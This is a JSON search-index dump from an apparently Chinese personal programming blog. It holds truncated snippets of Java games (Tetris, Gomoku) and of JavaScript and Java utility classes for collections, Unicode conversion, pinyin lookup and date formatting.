getCanvas() { return canvas; } //开始游戏 public void playGame() { play(); ctrlPanel.setPlayButtonEnable( false); miPlay.setEnabled( false); ctrlPanel.requestFocus(); } //游戏暂停 public void pauseGame() { if (block != null) block.pauseMove(); ctrlPanel.setPauseButtonLabel( false); miPause.setEnabled( false); miResume.setEnabled( true); } //让暂停中的游戏继续 public void resumeGame() { if (block != null) block.resumeMove(); ctrlPanel.setPauseButtonLabel( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.requestFocus(); } //用户停止游戏 public void stopGame() { playing = false; if (block != null) block.stopMove(); miPlay.setEnabled( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.setPlayButtonEnable( true); ctrlPanel.setPauseButtonLabel( true); } //得到游戏者设置的难度， @return int,游戏难度1－MAX_LEVEL public int getLevel() { return ctrlPanel.getLevel(); } //用户设置游戏难度，@param level int,游戏难度1－ MAX_LEVEL public void setLevel(int level) { if (level \u003c 11 \u0026\u0026 level \u003e 0) ctrlPanel.setLevel(level); } //得到游戏积分, @return int, 积分。 public int getScore() { if (canvas != null) return canvas.getScore(); return 0 ; } //得到自上次升级以来的游戏积分，升级以后，此积分清零 //@return int, 积分。 public int getScoreForLevelUpdate() { if (canvas != null) return canvas.getScoreForLevelUpdate(); return 0 ; } //当分数累计到一定的数量时，升一次级 //@return boolean, ture-update successufl, false-update fail pub","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/:0:0","tags":["linux","java","scripts"],"title":"Java 俄罗斯方块","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","那些有用没用的"],"content":"五子棋","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/","tags":["linux","java","scripts"],"title":"java 五子棋","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["linux","那些有用没用的"],"content":" import java.awt.*; import java.awt.event.*; import javax.swing.*; import javax.swing.JPanel; /* *main方法创建了ChessFrame类的一个实例对象（cf）， *并启动屏幕显示显示该实例对象。 **/ @SuppressWarnings(\"serial\") public class FiveChessAppletDemo { @SuppressWarnings( \"deprecation\") public static void main(String args[]){ ChessFrame cf = new ChessFrame(); cf.show(); } } /* *类ChessFrame主要功能是创建五子棋游戏主窗体和菜单 **/ class ChessFrame extends JFrame implements ActionListener { private String[] strsize={\"20x15\",\"30x20\", \"40x30\"}; private String[] strmode={\"人机对弈 \",\" 人人对弈 \"}; public static boolean iscomputer=true,checkcomputer= true; private int width,height; private ChessModel cm; private MainPanel mp; //构造五子棋游戏的主窗体 public ChessFrame() { this.setTitle( \"五子棋游戏\"); cm= new ChessModel(1); mp= new MainPanel(cm); Container con= this.getContentPane(); con.add(mp, \"Center\"); this.setResizable( false); this.addWindowListener( new ChessWindowEvent()); MapSize( 20,15 ); JMenuBar mbar = new JMenuBar(); this.setJMenuBar(mbar); JMenu gameMenu = new JMenu(\"游戏 \"); mbar.add(makeMenu(gameMenu, new Object[] { \"开局\", \"棋盘\" ,\"模式 \", null , \"退出 \" }, this)); JMenu lookMenu = new JMenu(\"视图 \"); mbar.add(makeMenu(lookMenu, new Object[] { \"Metal\",\"Motif\" ,\"Windows\" }, this)); JMenu helpMenu = new JMenu(\"帮助 \"); mbar.add(makeMenu(helpMenu, new Object[] { \"关于\" }, this)); } //构造五子棋游戏的主菜单 public JMenu makeMenu(Object parent, Object items[], Object target){ JMenu m = null; if(parent instanceof JMenu) m = (JMenu)parent; else if (parent instanceof String) m = new JMenu((String)parent); else return null ; for(int i = 0; i \u003c items.length; i++) if(items[i] == null) m.addSeparator(); else if (items[i] == \"棋盘\" ){ JMenu jm = new JMenu(\"棋盘 \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int j=0;j\u003cstrsize.length;j++){ rmenu=makeRadioButtonMenuItem(strsize[j],target); if (j==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else if (items[i] == \"模式\" ){ JMenu jm = new JMenu(\"模式 \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int h=0;h\u003cstrmode.length;h++){ rmenu=makeRadioButtonMenuItem(strmode[h],target); if(h==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else m.add(makeMenuItem(items[i], target)); return m; } //构造五子棋游戏的菜单项 public JMenuItem makeMenuItem(Object item, Object target){ JMenuItem r = null; if(item instanceof String) r = new JMenuItem((String)item); else if (item instanceof JMenuItem) r = (JMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } //构造五子棋游戏的单选按钮式菜单项 public JRadioButtonMenuItem makeRadioButtonMenuItem( Object item, Object target){ JRadioButtonMenuItem r = null; if(item instanceof String) r = new JRadioButtonMenuItem((String)item); else if(item instanceof JRadioButtonMenuItem) r = (JRadioButtonMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } public void MapSize(int w,int h){ setSize(w * 20+50 , h * 20+ 100 ); if( this.checkcomputer) this.iscomputer= true; else this.iscomputer= false; mp.setModel(cm); mp.repaint(); } public boolean getiscomputer(){ return this.iscomputer; } public void restart(){ int modeChess = cm.getModeChess(); if(modeChess \u003c= 3 \u0026\u0026 modeChess \u003e= 1){ cm = new ChessModel(modeChess); MapSize(cm.getWidth(),cm.getHeight()); }else{ System.out.println( \"\\u81EA\\u5B9A\\u4E49\" ); } } public void actionPerformed(ActionEvent e){ String arg=e.getActionCommand(); try{ if (arg.equals(\"Windows\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.windows.WindowsLookAndFeel\" ); else if (arg.equals(\"Motif\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.motif.MotifLookAndFeel\" ); else UIManager.setLookAndFeel( \"javax.swing.plaf.metal.MetalLookAndFeel\" ); SwingUtilities.updateComponentTreeUI( this); } catch(Exception ee){} if(arg.equals(\"20x15\")){ this.width= 20; this.height= 15; cm= new ChessModel(1); MapSize( this.width, this.height","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/:0:0","tags":["linux","java","scripts"],"title":"java 五子棋","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["那些年的收藏"],"content":"javascript 帮助类","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/","tags":["linux","javascript","scripts"],"title":"javascript 帮助类","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["那些年的收藏"],"content":" function check_browser() { Opera = (navigator .userAgent .indexOf (\"Opera\", 0) != -1 )?1: 0; MSIE = (navigator .userAgent .indexOf (\"Microsoft\", 0) != -1 )?1: 0; FX = (navigator .userAgent .indexOf (\"Mozilla\", 0) != -1 )?1: 0; if ( Opera ) brow_type = \"Opera\"; else if ( FX )brow_type = \"Firefox\"; else if ( MSIE )brow_type = \"MSIE\"; return brow_type ; } function getWindowHeight() { var windowHeight = 0 ; if ( typeof(window.innerHeight ) == 'number') { windowHeight = window .innerHeight ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientHeight) { windowHeight = document .documentElement .clientHeight ; } else { if ( document.body \u0026\u0026 document .body .clientHeight ) { windowHeight = document .body .clientHeight ; } } } return windowHeight; } function getWindowWidth() { var windowWidth = 0 ; if ( typeof(window.innerWidth ) == 'number') { windowWidth = window .innerWidth ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientWidth) { windowWidth = document .documentElement .clientWidth ; } else { if ( document.body \u0026\u0026 document .body .clientWidth ) { windowWidth = document .body .clientWidth ; } } } return windowWidth; } /*open window at the middle\u0026center of screen*/ function openwindow(url,name,iWidth,iHeight,isFullScreen ) { var url; var name; var iWidth; var iHeight; if(isFullScreen !=undefined \u0026\u0026 isFullScreen== '1') { iWidth = window .screen .availWidth - 10; iHeight = window .screen .availHeight - 30; } var iTop = ( window.screen.availHeight -30- iHeight)/2 ; var iLeft = ( window.screen.availWidth -10- iWidth)/2 ; window .open (url ,name ,'height='+ iHeight+',innerHeight=' +iHeight +',width='+ iWidth+',innerWidth=' +iWidth +',top='+ iTop+',left=' +iLeft +',toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,status=yes,titlebar=yes' ); } /* function: compare old_str and new_str, then output add_str and del_str example_1: old_str=1,2,3,5;new_str=1,3,4,6;compareStr(old_str,new_str)=4,6;2,5 notice: under any condition, ';' exists all the same! */ function compareStr(oldStr,newStr) { if(oldStr==newStr) { return ';' ; } if(oldStr=='' ) { return newStr+ ';'; } if(newStr=='' ) { return ';' +oldStr ; } var oldArr = oldStr.split(',' ); var newArr = newStr.split(',' ); var dels = '' ; var adds = '' ; for(var i= 0;i\u003coldArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003cnewArr .length ;j ++) { if(oldArr[i] == newArr[j] ) { tag = 1; break; } } if(tag == 0) { dels = dels + oldArr[i] + ','; } } for(var i= 0;i\u003cnewArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003coldArr .length ;j ++) { if(newArr[i] == oldArr[j] ) { tag = 1; break; } } if(tag == 0) { adds = adds + newArr[i] + ','; } } if(dels=='' \u0026\u0026 adds!='' ) { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' ; } else if (adds =='' \u0026\u0026 dels !='') { return ';' + dels.substring (0, dels.lastIndexOf (',')); } else if (adds =='' \u0026\u0026 dels =='') { return ';' ; } else { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' + dels.substring( 0,dels.lastIndexOf (',')); } } /*JS高精度计算*/ //除法 function accDiv(arg1,arg2){ var t1= 0,t2=0 ,r1 ,r2 ; try{t1=arg1.toString ().split( \".\")[1].length}catch (e ){} try{t2=arg2.toString ().split( \".\")[1].length}catch (e ){} with(Math){ r1 =Number (arg1 .toString ().replace( \".\",\"\" )) r2 =Number (arg2 .toString ().replace( \".\",\"\" )) return ( r1/ r2)* pow(10 ,t2 -t1 ); } } //乘法 function accMul(arg1,arg2) { var m= 0,s1=arg1.toString (),s2= arg2.toString (); try{m+=s1.split(\".\" )[ 1] .length }catch( e){} try{m+=s2.split(\".\" )[ 1] .length }catch( e){} return Number(s1. replace(\".\" ,\"\"))* Number(s2.replace(\".\" ,\"\"))/ Math.pow(10 ,m ); } //加法 function accAdd(arg1,arg2){ var r1, r2, m; try{r1=arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{r2=arg2.toString ().split( \".\")[1].length}catch (e ){r2 =0} m =Math .pow (10, Math.max(r1,r2)) return ( arg1*m+arg2*m)/m; } //减法 function accSubtr(arg1,arg2){ var r1 ,r2 ,m ,n ; try{ r1= arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{ r2= arg2.toString ","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/:0:0","tags":["linux","javascript","scripts"],"title":"javascript 帮助类","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["那些年的收藏"],"content":"javascript 帮助类","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/","tags":["linux","javascript","scripts"],"title":"javascript 封装map、list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"当年收藏的一个封装脚本 /* * Util.$(objid)：获取指定ID的dom对象 * * Util.ie：判断浏览器是否为IE * * List类：模拟java的List，支持iterator * add(obj)：向List的最后追加一个对象 * addat(index, obj)：在List的index位置插入一个对象 * get(index)：在List获取index位置的对象 * set(index, obj)：在List的替换index位置的对象 * size()：获取List的对象个数 * remove(index)：移除List中index位置的对象 * clear()：清空List * iterator()：获取到List的迭代对象 * * Map类：模拟java的Map，支持直接对value的iterator * put(key, value)：在Map的添加一个key value的键值对 * get(key)：在Map获取键为key的值 * remove(key)：溢出Map中键为key的对象 * containsKey(key)：判断Map中是否存在指定key的对象 * keySet()：获取Map中所有的键的List * values()：获取Map中所有的值的List * size()：获取List的对象个数 * clear()：清空List * iterator()：获取到List的迭代对象 * * Iterator用法：for(var it = list.iterator(); it.hasNext();) { var item = it.next(); } * * Url类：获取url中参数的值，使用var u = new Url(location.search); var value = url.getvalue(para);即可得到 * * EventHandler类：封装事件方法，可以为事件方法的调用添加参数，屏蔽了浏览器差异 * EventHandler.createEvent(func, ...args)：创建事件对象，args为参数值，需要与func的参数对应，不需要传递event对象 * EventHandler.getEvent()：在事件的处理方法中获取当前的event对象 * EventHandler.getElement(e)：获取触发event事件的dom对象 * EventHandler.attachEvent(obj, eventname, func)：为obj添加eventname事件，事件处理方法为func * EventHandler.detachEvent(obj, eventname, func)：为obj注销eventname事件的func方法 * * EventType类：封装了客户端的大多数事件类型，屏蔽了浏览器差异 * 使用方式：EventHandler.attachEvent(obj, EventType.click, func) * 目前封装了click, rclick, mousedown, mousemove, mouseup, mouseover, mouseout, scroll, focus, blur, change, keypress, keydown, keyup, submit */ /* * 修改记录 */ function Util() {} Util.$ = function (objid) { return document.getElementById(objid); }; //浏览器的判断，true为IE，false为Firefox Util.ie = navigator.appName.indexOf(\"Microsoft\") != -1 ? true : false; function Iterator(iteratorArray) { this.itArr = iteratorArray; this.index = -1; } Iterator.prototype = { hasNext: function () { if (this.index + 1 \u003e= this.itArr.length) { return false; } else { return true; } }, next: function () { this.index++; return this.itArr[this.index]; }, }; function Map() { this.arr = new Array(); } Map.prototype = { put: function (key, value) { if (!this.containsKey(key)) { this.arr.push([key, value]); } else { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr[i][1] = value; return; } } } }, get: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return this.arr[i][1]; } } return null; }, remove: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr.splice(i, 1); return; } } }, containsKey: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return true; } } return false; }, keySet: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][0]); } return l; }, values: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][1]); } return l; }, size: function () { return this.arr.length; }, clear: function () { this.arr = []; }, iterator: function () { var vs = new Array(); for (var i = 0; i \u003c this.arr.length; i++) { vs.push(this.arr[i][1]); } var it = new Iterator(vs); return it; }, }; function List() { this.arr = new Array(); } List.prototype = { add: function (obj) { this.arr.push(obj); }, addat: function (index, obj) { this.arr.splice(index, 0, obj); }, get: function (index) { return this.arr[index]; }, set: function (index, obj) { this.arr.splice(index, 1, obj); }, size: function () { return this.arr.length; }, remove: function (index) { this.arr.splice(index, 1); }, clear: function () { this.arr = []; }, iterator: function () { var it = new Iterator(this.arr); return it; }, }; function Url(urlstr) { this.paraMap = new Map(); if (urlstr.indexOf(\"?\") \u003e -1) { urlstr = urlstr.substr(1); } if (urlstr.indexOf(\"\u0026\") \u003e -1) { var pvarr = urlstr.split(\"\u0026\"); for (var i = 0; i \u003c pvarr.length; i++) { var pv = pvarr[i].split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } else { var pv = urlstr.split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } Url.prototype = { getvalue: function (para) { return this.","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/:0:0","tags":["linux","javascript","scripts"],"title":"javascript 封装map、list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"汉字及unicode互转","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/","tags":["linux","java","scripts"],"title":"java汉字及unicode互转","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["那些年的收藏"],"content":"java 汉字和unicode互转 import java.io.UnsupportedEncodingException; public class UnicodeConverter { public static void main(String[] args) throws UnsupportedEncodingException { String s = \" \\t小\\u51AC\"; System.out.println(\"Original:\\t\\t\" + s); s = toEncodedUnicode(s, true); System.out.println(\"to unicode:\\t\\t\" + s); s = fromEncodedUnicode(s.toCharArray(), 0, s.length()); System.out.println(\"from unicode:\\t\" + s); } private static final char[] hexDigit = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' }; private static char toHex(int nibble) { return hexDigit[(nibble \u0026 0xF)]; } /** * 将字符串编码成 Unicode 形式的字符串. 如 \"小\" to \"\\u5c0f\" * Converts unicodes to encoded \\\\uxxxx and escapes * special characters with a preceding slash * * @param theString * 待转换成Unicode编码的字符串。 * @param escapeSpace * 是否忽略空格，为true时在空格后面是否加个反斜杠。 * @return 返回转换后Unicode编码的字符串。 */ public static String toEncodedUnicode(String theString, boolean escapeSpace) { int len = theString.length(); int bufLen = len * 2; if (bufLen \u003c 0) { bufLen = Integer.MAX_VALUE; } StringBuffer outBuffer = new StringBuffer(bufLen); for (int x = 0; x \u003c len; x++) { char aChar = theString.charAt(x); // Handle common case first, selecting largest block that // avoids the specials below if ((aChar \u003e 61) \u0026\u0026 (aChar \u003c 127)) { if (aChar == '\\\\') { outBuffer.append('\\\\'); outBuffer.append('\\\\'); continue; } outBuffer.append(aChar); continue; } switch (aChar) { case ' ': if (x == 0 || escapeSpace) outBuffer.append('\\\\'); outBuffer.append(' '); break; case '\\t': outBuffer.append('\\\\'); outBuffer.append('t'); break; case '\\n': outBuffer.append('\\\\'); outBuffer.append('n'); break; case '\\r': outBuffer.append('\\\\'); outBuffer.append('r'); break; case '\\f': outBuffer.append('\\\\'); outBuffer.append('f'); break; case '=': // Fall through case ':': // Fall through case '#': // Fall through case '!': outBuffer.append('\\\\'); outBuffer.append(aChar); break; default: if ((aChar \u003c 0x0020) || (aChar \u003e 0x007e)) { // 每个unicode有16位，每四位对应的16进制从高位保存到低位 outBuffer.append('\\\\'); outBuffer.append('u'); outBuffer.append(toHex((aChar \u003e\u003e 12) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 8) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 4) \u0026 0xF)); outBuffer.append(toHex(aChar \u0026 0xF)); } else { outBuffer.append(aChar); } } } return outBuffer.toString(); } /** * 从 Unicode 形式的字符串转换成对应的编码的特殊字符串。 如 \"\\u5c0f\" to \"小\". * Converts encoded \\\\uxxxx to unicode chars * and changes special saved chars to their original forms * * @param in * Unicode编码的字符数组。 * @param off * 转换的起始偏移量。 * @param len * 转换的字符长度。 * @param convtBuf * 转换的缓存字符数组。 * @return 完成转换，返回编码前的特殊字符串。 */ public static String fromEncodedUnicode(char[] in , int off, int len) { char aChar; char[] out = new char[len]; // 只短不长 int outLen = 0; int end = off + len; while (off \u003c end) { aChar = in [off++]; if (aChar == '\\\\') { aChar = in [off++]; if (aChar == 'u') { // Read the xxxx int value = 0; for (int i = 0; i \u003c 4; i++) { aChar = in [off++]; switch (aChar) { case '0': case '1': case '2': case '3': case '4': case '5': case '6': case '7': case '8': case '9': value = (value \u003c\u003c 4) + aChar - '0'; break; case 'a': case 'b': case 'c': case 'd': case 'e': case 'f': value = (value \u003c\u003c 4) + 10 + aChar - 'a'; break; case 'A': case 'B': case 'C': case 'D': case 'E': case 'F': value = (value \u003c\u003c 4) + 10 + aChar - 'A'; break; default: throw new IllegalArgumentException(\"Malformed \\\\uxxxx encoding.\"); } } out[outLen++] = (char) value; } else { if (aChar == 't') { aChar = '\\t'; } else if (aChar == 'r') { aChar = '\\r'; } else if (aChar == 'n') { aChar = '\\n'; } else if (aChar == 'f') { aChar = '\\f'; } out[outLen++] = aChar; } } else { out[outLen++] = (char) aChar; } } return new String(out, 0, outLen); } } ","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/:0:0","tags":["linux","java","scripts"],"title":"java汉字及unicode互转","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["那些年的收藏"],"content":"汉字转拼音","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/","tags":["linux","java","scripts"],"title":"java汉字转拼音","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["那些年的收藏"],"content":"汉字转拼音(非使用依赖包) import java.nio.ByteBuffer; import java.util.TreeMap; /** * * 汉字转化为全拼 * JDK版本: 6 * 需要注意的是：这里面利用gb2312的编码规则，根据拼音区间来获取拼音，主要可以练习TreeMap的使用。 * 但其实拼音规则涵盖的中文并不全面，要求较高的地方不建议使用这个类。 * 附上拼音和汉字对照表pinyin1.txt，可以利用这个文件建立Map。 */ public class CharactorTool { private static TreeMap \u003c Integer, String \u003e spellTree = new TreeMap \u003c Integer, String \u003e (); static { initTreeMap(); } private CharactorTool() {} private static void initTreeMap() { spellTree.put(-20319, \"a\"); spellTree.put(-20317, \"ai\"); spellTree.put(-20304, \"an\"); spellTree.put(-20295, \"ang\"); spellTree.put(-20292, \"ao\"); spellTree.put(-20283, \"ba\"); spellTree.put(-20265, \"bai\"); spellTree.put(-20257, \"ban\"); spellTree.put(-20242, \"bang\"); spellTree.put(-20230, \"bao\"); spellTree.put(-20051, \"bei\"); spellTree.put(-20036, \"ben\"); spellTree.put(-20032, \"beng\"); spellTree.put(-20026, \"bi\"); spellTree.put(-20002, \"bian\"); spellTree.put(-19990, \"biao\"); spellTree.put(-19986, \"bie\"); spellTree.put(-19982, \"bin\"); spellTree.put(-19976, \"bing\"); spellTree.put(-19805, \"bo\"); spellTree.put(-19784, \"bu\"); spellTree.put(-19775, \"ca\"); spellTree.put(-19774, \"cai\"); spellTree.put(-19763, \"can\"); spellTree.put(-19756, \"cang\"); spellTree.put(-19751, \"cao\"); spellTree.put(-19746, \"ce\"); spellTree.put(-19741, \"ceng\"); spellTree.put(-19739, \"cha\"); spellTree.put(-19728, \"chai\"); spellTree.put(-19725, \"chan\"); spellTree.put(-19715, \"chang\"); spellTree.put(-19540, \"chao\"); spellTree.put(-19531, \"che\"); spellTree.put(-19525, \"chen\"); spellTree.put(-19515, \"cheng\"); spellTree.put(-19500, \"chi\"); spellTree.put(-19484, \"chong\"); spellTree.put(-19479, \"chou\"); spellTree.put(-19467, \"chu\"); spellTree.put(-19289, \"chuai\"); spellTree.put(-19288, \"chuan\"); spellTree.put(-19281, \"chuang\"); spellTree.put(-19275, \"chui\"); spellTree.put(-19270, \"chun\"); spellTree.put(-19263, \"chuo\"); spellTree.put(-19261, \"ci\"); spellTree.put(-19249, \"cong\"); spellTree.put(-19243, \"cou\"); spellTree.put(-19242, \"cu\"); spellTree.put(-19238, \"cuan\"); spellTree.put(-19235, \"cui\"); spellTree.put(-19227, \"cun\"); spellTree.put(-19224, \"cuo\"); spellTree.put(-19218, \"da\"); spellTree.put(-19212, \"dai\"); spellTree.put(-19038, \"dan\"); spellTree.put(-19023, \"dang\"); spellTree.put(-19018, \"dao\"); spellTree.put(-19006, \"de\"); spellTree.put(-19003, \"deng\"); spellTree.put(-18996, \"di\"); spellTree.put(-18977, \"dian\"); spellTree.put(-18961, \"diao\"); spellTree.put(-18952, \"die\"); spellTree.put(-18783, \"ding\"); spellTree.put(-18774, \"diu\"); spellTree.put(-18773, \"dong\"); spellTree.put(-18763, \"dou\"); spellTree.put(-18756, \"du\"); spellTree.put(-18741, \"duan\"); spellTree.put(-18735, \"dui\"); spellTree.put(-18731, \"dun\"); spellTree.put(-18722, \"duo\"); spellTree.put(-18710, \"e\"); spellTree.put(-18697, \"en\"); spellTree.put(-18696, \"er\"); spellTree.put(-18526, \"fa\"); spellTree.put(-18518, \"fan\"); spellTree.put(-18501, \"fang\"); spellTree.put(-18490, \"fei\"); spellTree.put(-18478, \"fen\"); spellTree.put(-18463, \"feng\"); spellTree.put(-18448, \"fo\"); spellTree.put(-18447, \"fou\"); spellTree.put(-18446, \"fu\"); spellTree.put(-18239, \"ga\"); spellTree.put(-18237, \"gai\"); spellTree.put(-18231, \"gan\"); spellTree.put(-18220, \"gang\"); spellTree.put(-18211, \"gao\"); spellTree.put(-18201, \"ge\"); spellTree.put(-18184, \"gei\"); spellTree.put(-18183, \"gen\"); spellTree.put(-18181, \"geng\"); spellTree.put(-18012, \"gong\"); spellTree.put(-17997, \"gou\"); spellTree.put(-17988, \"gu\"); spellTree.put(-17970, \"gua\"); spellTree.put(-17964, \"guai\"); spellTree.put(-17961, \"guan\"); spellTree.put(-17950, \"guang\"); spellTree.put(-17947, \"gui\"); spellTree.put(-17931, \"gun\"); spellTree.put(-17928, \"guo\"); spellTree.put(-17922, \"ha\"); spellTree.put(-17759, \"hai\"); spellTree.put(-17752, \"han\"); spellTree.put(-17733, \"hang\"); spellTree.put(-17730, \"hao\"); spellTree.put(-17721, \"he\"); spellTree.put(-17703, \"hei\"); spellTree.put(-17701, \"hen\"); spellTree.put(-17697, \"heng\"); spellTree.put(-17692, \"hong\"); spellTree.put(-17683, \"hou\"); spellTree.put(-17676, \"hu\"); spellTree.put(-17496, \"hua\"); spe","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/:0:0","tags":["linux","java","scripts"],"title":"java汉字转拼音","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["那些年的收藏"],"content":"日期格式化处理组件","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"Java日期格式化处理组件","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"java 日期格式化处理组件 import java.text.DateFormat; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.Date; import java.util.Locale; import org.apache.commons.lang.StringUtils; /** * 日期格式化处理组件 * @author chenxiaodong * @version Apr 21, 2010 5:50:00 PM */ public class TimeUtil s { /** * 将长整型的日期转化为字符型日期字符串 * @param intDate 长整型日期 */ public static String formatIntToDateString(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为字符型日期字符串 * @param intDate 长整型日期 * @return pattern 格式 */ public static String formatIntToDateString(long intDate,String pattern) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); if(pattern!=null) { format = new SimpleDateFormat(pattern, Locale.getDefault()); } else { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); } strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为字符型日期字符串 yyyy- MM-dd * @param intDate 长整型日期 * @return String 字符型时间 */ public static String formatIntToDateStringT(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为一定格式字符型日期字符串 * @param _format 格式化 例如:yyyy -MM- dd HH:mm:ss * @param intDate 长整型日期 * @return String 字符型时间 */ public static String formatIntToDateString(String _format, long intDate) { Date time = new Date(); SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(_format, Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型转换为日期类型 * @param intDate 长整型日期 * @return Date 日期类型时间 */ public static Date formatIntToDate(long intDate) { Date time = new Date(); if(intDate\u003e0){ time.setTime(intDate * 1000); } return time; } /** * 将字符串转换为日期类型 * @param strDate 字符型日期 * @return Date 日期类型时间 */ public static Date formatStringToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; } } /** * 将字符串转换为日期类型 * @param strDate 字符型日期 * @return Date 日期类型时间 */ public static Date formatStrToDate(String strDate) { SimpleDateFormat format; if (strDate.trim().equals(\"\" )) return null ; try { format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale . getDefault()); return format.parse(strDate); } catch (Exception ex) { return null ; 